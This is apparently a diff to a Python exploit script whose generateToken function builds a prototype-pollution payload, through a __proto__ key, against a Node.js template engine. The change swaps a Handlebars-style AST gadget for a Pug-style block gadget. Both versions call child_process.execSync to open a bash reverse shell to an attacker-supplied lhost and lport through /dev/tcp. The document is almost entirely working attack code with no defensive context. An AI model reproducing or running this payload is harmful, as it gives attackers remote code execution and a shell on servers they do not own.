@@ -61,20 +61,11 @@ def generateToken(lhost, lport, rhost):
                 "initial-program": "",
                 "__proto__": 
                 {
-                "type": "Program",
-                "body":[
+                "block":
                     {
-                    "type": "MustacheStatement",
-                    "path":0,
-                    "loc": 0,
-                    "params":[
-                        {
-                        "type": "NumberLiteral",
-                        "value": f"console.log(process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'`).toString())" 
-                        } 
-                    ]
+                    "type": "Text",
+                    "line":f"process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'`)"
                     }
-                ]
                 }
             }
         }
